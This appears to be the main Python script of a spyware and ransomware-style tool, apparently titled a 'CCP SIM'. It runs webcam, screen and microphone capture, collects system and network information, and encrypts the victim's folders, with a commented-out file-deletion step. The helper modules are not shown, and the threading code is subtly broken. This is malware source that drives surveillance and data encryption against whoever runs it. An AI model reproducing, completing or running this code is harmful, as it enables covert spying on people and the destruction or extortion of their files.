import threading

import Features.feature
from Features.feature import \
    Webcamera, \
    Screenshot, \
    Microphone, \
    SysInfo, \
    CmdPrompts, \
    FileEncryption

class MainFileException(Exception):
    pass

def main():
    ascii_art = """
       _____ _____ _____     _____ _____ __  __ 
      / ____/ ____|  __ \   / ____|_   _|  \/  |
     | |   | |    | |__) | | (___   | | | \  / |
     | |   | |    |  ___/   \___ \  | | | |\/| |
     | |___| |____| |       ____) |_| |_| |  | |
      \_____\_____|_|      |_____/|_____|_|  |_|                                  
        """
    print(ascii_art)

    for i in range(5,0,-1):
        print(f"Wait: {i}")

    # List of features to run
    features = [
        Webcamera.record_screen(),
        Screenshot.screenshot(),
        Microphone.audio_recording(),
        SysInfo.system_information(),
        CmdPrompts.ipconfig_all(),
        FileEncryption.encrypt_folders(),
        #FileEncryption.delete_files()
    ]

    try:
        # Create threads for each selected function
        threads = [threading.Thread(target=features) for feature in features]

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    except Exception as e:
        raise MainFileException("Main failed to run") from e

if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")